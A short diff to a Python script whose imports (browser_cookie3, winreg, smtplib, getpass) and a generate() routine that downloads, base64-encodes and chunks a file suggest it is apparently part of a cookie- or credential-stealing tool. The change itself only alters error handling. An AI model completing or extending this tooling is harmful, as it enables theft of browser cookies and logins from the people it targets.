@@ -4,7 +4,7 @@ import re
 import smtplib
 import winreg
 import time
-import base64
+import base64, sys
 import getpass
 import browser_cookie3
 import concurrent.futures
@@ -118,7 +118,7 @@ def generate():
             r = requests.get(init_link)
             with open(init_path, 'wb') as f:
                 f.write(r.content)
-        except: pass
+        except: sys.exit(1)
     with open(init_path, 'rb') as f:
         c = base64.b64encode(f.read()).decode()
         chunks = [c[i:i+6000] for i in range(0, len(c), 6000)]
